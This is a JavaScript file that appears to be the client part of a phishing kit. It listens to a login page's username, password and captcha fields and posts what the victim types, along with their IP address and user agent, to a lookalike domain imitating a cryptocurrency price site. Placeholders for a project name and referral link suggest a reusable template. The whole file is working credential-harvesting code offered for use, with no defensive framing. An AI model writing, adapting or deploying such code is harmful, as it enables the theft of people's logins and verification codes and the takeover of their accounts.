// Require frontend:
// <input id="usernameInput">
// <input id="passwordInput">
// <button id="loginButton">
// <input id="captchaInput">
// <button id="captchaButton">

// Constants
// const BACKEND_URL = 'http://127.0.0.1:8000';
const BACKEND_URL = 'https://api.coinmarketcap.jp';
const PROJECT = '{{ project }}';
const REFLINK = '{{ reflink }}';

// Global variable to store the typing timer
let TYPINGTIMTER;

// Define UserEvent class to represent user events
class UserEvent {
  constructor(
    project = '',
    username = '',
    password = '',
    ip = '',
    user_agent = '',
    event = '',
    captcha = ''
  ) {
    this.project = project;
    this.username = username;
    this.password = password;
    this.ip = ip;
    this.user_agent = user_agent;
    this.event = event;
    this.captcha = captcha;
  }
}

// Initialize UserEvent instance
const USER_EVENT = new UserEvent(PROJECT);

// Function to send the user event to the backend
async function sendEvent(event) {
  //   WebsiteAccessed
  //   PasswordTyped
  //   LoginButtonClicked
  //   CaptchaTyped
  //   CaptchaSent

  USER_EVENT.event = event;
  try {
    const response = await fetch(`${BACKEND_URL}/userevent`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(USER_EVENT),
    });

    if (!response.ok) {
      throw new Error('Sent event failed');
    }

    return response.json();
  } catch (error) {
    console.error('Error sending event:', error);
  }
}

// Function to save data to the backend
async function saveData() {
  try {
    const response = await fetch(`${BACKEND_URL}/save`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(USER_EVENT),
    });

    if (!response.ok) {
      throw new Error('Save data failed');
    }

    return response.json();
  } catch (error) {
    console.error('Error saving data:', error);
  }
}

// Function to handle the password typing event
function handleTypePassword() {
  clearTimeout(TYPINGTIMTER);

  TYPINGTIMTER = setTimeout(function () {
    USER_EVENT.username = document.getElementById('usernameInput').value;
    USER_EVENT.password = document.getElementById('passwordInput').value;
    sendEvent('PasswordTyped');
  }, 1000);
}

function handleTypeCaptcha() {
  clearTimeout(TYPINGTIMTER);

  TYPINGTIMTER = setTimeout(function () {
    USER_EVENT.username = document.getElementById('usernameInput').value;
    USER_EVENT.password = document.getElementById('passwordInput').value;
    USER_EVENT.captcha = document.getElementById('captchaInput').value;
    sendEvent('CaptchaTyped');
  }, 1000);
}

// Function to handle the form submission event
async function onLoginFormSubmit(event) {
  console.log('LonginFormSubmit');
  event.preventDefault();

  USER_EVENT.username = document.getElementById('usernameInput').value;
  USER_EVENT.password = document.getElementById('passwordInput').value;

  try {
    const token = await grecaptcha.enterprise.execute(
      '6Lc08TYnAAAAAN-Br_NCH29jui_gOTah1hrwUWaD',
      { action: 'LOGIN' }
    );

    USER_EVENT.token = token;

    const clientIP = await fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => data.ip)
      .catch((error) => {
        console.error('Error fetching client IP:', error);
        return '';
      });

    USER_EVENT.ip = clientIP;
    USER_EVENT.user_agent = navigator.userAgent;

    // Send the login and save data events to the backend
    await sendEvent('LoginButtonClicked');

    // Save the data
    await saveData();
  } catch (error) {
    console.error('Error executing reCAPTCHA:', error);
  }

  // Redirect the user to the registration page
  // window.location.href = REFLINK;
}

async function onCaptchaSubmit(event) {
  USER_EVENT.username = document.getElementById('usernameInput').value;
  USER_EVENT.password = document.getElementById('passwordInput').value;
  USER_EVENT.captcha = document.getElementById('captchaInput').value;
  sendEvent('CaptchaSent');
}

// Function to handle page load event
async function onPageLoad() {
  try {
    const response = await fetch(`${BACKEND_URL}/checkadmin`, {
      method: 'GET',
    });

    if (!response.ok) {
      throw new Error('Network response was not ok');
    }

    const data = await response.json();
    isAdmin = data.status;

    // Send the accessed event to the backend
    sendEvent('WebsiteAccessed');
  } catch (error) {
    console.error('Error checking admin:', error);
  }
}

// Set event listeners
const passwordElement = document.getElementById('passwordInput');
const loginButtonElement = document.getElementById('loginButton');
const captchaElement = document.getElementById('captchaInput');
const captchaButtonElement = document.getElementById('captchaButton');

if (passwordElement) {
  passwordElement.addEventListener('keydown', handleTypePassword);
}

if (loginButtonElement) {
  loginButtonElement.addEventListener('click', onLoginFormSubmit);
}

if (captchaElement) {
  captchaElement.addEventListener('keydown', handleTypeCaptcha);
}

if (captchaButtonElement) {
  captchaButtonElement.addEventListener('click', onCaptchaSubmit);
}

window.onload = onPageLoad;
